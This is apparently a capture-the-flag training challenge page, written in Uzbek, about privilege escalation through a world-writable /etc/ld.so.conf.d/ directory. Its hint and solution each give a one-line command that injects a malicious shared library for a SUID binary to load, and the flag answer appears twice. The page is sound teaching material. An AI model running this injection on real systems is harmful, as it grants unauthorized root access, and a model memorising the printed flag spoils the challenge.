---
id: 15
title: "CH15: Writable /etc/ld.so.conf.d/ Shared Lib Injection"
module: "Modul 2: PrivEsc & Binary Exploitation"
difficulty: Hard
points: 9
tags: ['shared-lib', 'ldconfig', 'privesc', 'c']
flag: "HD{shared_library_ld_config_injection_915}"
---

# 🎯 Topshiriq #15: CH15: Writable /etc/ld.so.conf.d/ Shared Lib Injection

## 📌 Metama'lumotlar:
* **Modul:** `Modul 2: PrivEsc & Binary Exploitation`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 9 ball`
* **Teglar:** #shared-lib, #ldconfig, #privesc, #c

---

## 📝 Topshiriq Senariysi (Scenario):
/etc/ld.so.conf.d/ papkasi yozish uchun ochiq (777). Yangi kutubxona yo'lini kiritib, 'ldconfig' orqali SUID binar chaqiradigan '.so' faylni almashtiring.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> echo '/tmp/lib' > /etc/ld.so.conf.d/pwn.conf && gcc -shared -fPIC -o /tmp/lib/libtarget.so pwn.c && ldconfig

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
echo '/tmp/lib' > /etc/ld.so.conf.d/pwn.conf && gcc -shared -fPIC -o /tmp/lib/libtarget.so pwn.c && ldconfig
```

---

## 🚩 Maxfiy Flag:
`HD{shared_library_ld_config_injection_915}`
